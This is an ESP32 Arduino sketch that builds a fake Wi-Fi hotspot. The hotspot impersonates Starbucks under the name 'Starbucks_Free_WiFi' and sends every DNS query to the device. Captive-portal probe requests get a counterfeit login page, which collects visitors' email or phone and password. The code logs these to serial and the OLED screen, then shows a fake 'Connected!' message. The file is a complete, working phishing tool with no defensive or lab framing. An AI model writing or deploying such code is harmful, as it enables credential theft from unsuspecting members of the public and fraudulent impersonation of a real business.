#include <WiFi.h>
#include <WebServer.h>
#include <Wire.h>
#include <Adafruit_SSD1306.h>
#include <DNSServer.h> // Import DNS Server library

#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET    -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

// Wi-Fi credentials
const char *ssid = "Starbucks_Free_WiFi";
const char *password = "";

WebServer server(80); // HTTP server on port 80
DNSServer dnsServer;  // DNS server for redirection

String lastCapturedUsername = "";
String lastCapturedPassword = "";

// Function declarations
void handleRoot();
void handleCapture();
void dnsQueryCallback(const char *domain, IPAddress &ip);

void setup() {
  Serial.begin(115200);
  delay(1000);

  // Initialize OLED display
  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println(F("SSD1306 allocation failed"));
  } else {
    display.clearDisplay();
    display.setTextSize(1);
    display.setTextColor(WHITE);
    display.setCursor(0,0);
    display.println("Starting Wi-Fi...");
    display.display();
  }

  // Setup Wi-Fi AP
  WiFi.mode(WIFI_AP);
  bool result = WiFi.softAP(ssid, password);

  if(result) {
    Serial.println("Wi-Fi AP started!");
    Serial.println("SSID: " + String(ssid));
    Serial.println("IP address: " + WiFi.softAPIP().toString());

    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0,0);
    display.println("AP Started:");
    display.println(ssid);
    display.println(WiFi.softAPIP());
    display.display();
  } else {
    Serial.println("Wi-Fi AP Failed!");
  }

  // Start DNS server to handle redirection
  dnsServer.start(53, "*", WiFi.softAPIP()); // Redirect all DNS queries to the ESP32's IP address

  // HTTP Server handling
  server.on("/", handleRoot);
  server.on("/generate_204", handleRoot);
  server.on("/connecttest.txt", handleRoot);
  server.on("/hotspot-detect.html", handleRoot);
  server.on("/ncsi.txt", handleRoot);
  server.on("/capture", HTTP_POST, handleCapture);  // <-- Handle form POST
  server.onNotFound(handleRoot);

  server.begin();
  Serial.println("HTTP server started");
}

void loop() {
  dnsServer.processNextRequest();  // DNS redirection
  server.handleClient();           // Handle HTTP requests
}

// Fake Starbucks Login Page
void handleRoot() {
  String page = "<!DOCTYPE html><html><head><title>Starbucks Wi-Fi</title></head><body style='text-align:center; font-family:Arial;'>";
  page += "<h1>Welcome to Starbucks</h1>";
  page += "<p>Please login to access free Wi-Fi</p>";
  page += "<form action='/capture' method='POST'>";
  page += "<input type='text' name='username' placeholder='Email or Phone'><br><br>";
  page += "<input type='password' name='password' placeholder='Password'><br><br>";
  page += "<input type='submit' value='Login'>";
  page += "</form>";
  page += "</body></html>";

  server.send(200, "text/html", page);
}

// Capture credentials
void handleCapture() {
  if (server.hasArg("username") && server.hasArg("password")) {
    lastCapturedUsername = server.arg("username");
    lastCapturedPassword = server.arg("password");

    Serial.println("===== New Login Captured =====");
    Serial.println("Username: " + lastCapturedUsername);
    Serial.println("Password: " + lastCapturedPassword);
    Serial.println("===============================");

    // Update OLED screen
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0,0);
    display.println("Captured Login:");
    display.println("User:");
    display.println(lastCapturedUsername);
    display.println("Pass:");
    display.println(lastCapturedPassword);
    display.display();
  }

  // Send "connected" success page
  server.send(200, "text/html", "<html><body><h2>Connected!<br>Enjoy your Wi-Fi.</h2></body></html>");
}

// DNS Query Callback (handle all DNS queries to redirect to the login page)
void dnsQueryCallback(const char *domain, IPAddress &ip) {
  // Redirect all DNS requests to the AP's IP address
  ip = WiFi.softAPIP();
}
